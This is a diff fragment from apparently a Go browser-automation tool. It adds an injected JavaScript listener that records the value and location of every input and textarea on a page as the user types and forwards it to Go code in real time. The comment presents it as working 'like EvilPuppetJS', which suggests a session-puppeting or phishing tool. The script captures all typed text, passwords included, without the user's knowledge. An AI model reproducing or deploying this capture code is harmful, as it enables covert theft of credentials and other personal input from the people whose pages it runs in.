+// It watches for input/textarea changes and immediately notifies Go through a binding,
+// providing near-instant text synchronization like EvilPuppetJS.
+const inputListenerScript = `(function() {
+    if (window.__puppetInputListenerAttached) return;
+    window.__puppetInputListenerAttached = true;
+
+    function getCssPath(el) {
+        if (!(el instanceof Element)) return '';
+        var path = [];
+        while (el.nodeType === Node.ELEMENT_NODE) {
+            var selector = el.nodeName.toLowerCase();
+            if (el.id) {
+                selector += '#' + el.id;
+                path.unshift(selector);
+                break;
+            } else {
+                var sib = el, nth = 1;
+                while (sib = sib.previousElementSibling) {
+                    if (sib.nodeName.toLowerCase() == selector) nth++;
+                }
+                if (nth != 1) selector += ':nth-of-type(' + nth + ')';
+            }
+            path.unshift(selector);
+            el = el.parentNode;
+        }
+        return path.join(' > ');
+    }
+
+    document.addEventListener('input', function(e) {
+        var tag = e.target.tagName.toLowerCase();
+        if (tag === 'input' || tag === 'textarea') {
+            try {
+                __puppetInputChanged(JSON.stringify({
+                    cssPath: getCssPath(e.target),
+                    value: e.target.value,
+                    selectionStart: e.target.selectionStart || 0,
+                    selectionEnd: e.target.selectionEnd || 0
+                }));
+            } catch(err) {}
+        }
+    });
+})()`
